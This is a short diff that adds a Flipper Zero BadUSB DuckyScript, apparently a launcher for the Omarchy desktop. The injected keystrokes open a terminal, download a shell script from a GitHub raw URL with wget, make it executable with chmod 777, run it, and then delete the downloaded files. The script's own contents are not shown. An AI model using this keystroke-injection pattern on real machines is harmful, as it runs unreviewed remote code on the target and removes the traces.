@@ -1,0 +1,11 @@
+REM RUN DOWNLOADED .SH
+GUI ENTER
+DELAY 1000
+STRING wget https://raw.githubusercontent.com/knoxoxen/Omarchy-Flipper0-Badusb/main/launchers/prgbtriplev2/prgbtriplev2.sh
+ENTER
+DELAY 5000
+STRING chmod 777 prgbtriplev2.sh
+ENTER
+STRINGLN ./prgbtriplev2.sh
+STRING rm -f prgbtriplev2.sh prgbtriplev2-fx
+ENTER
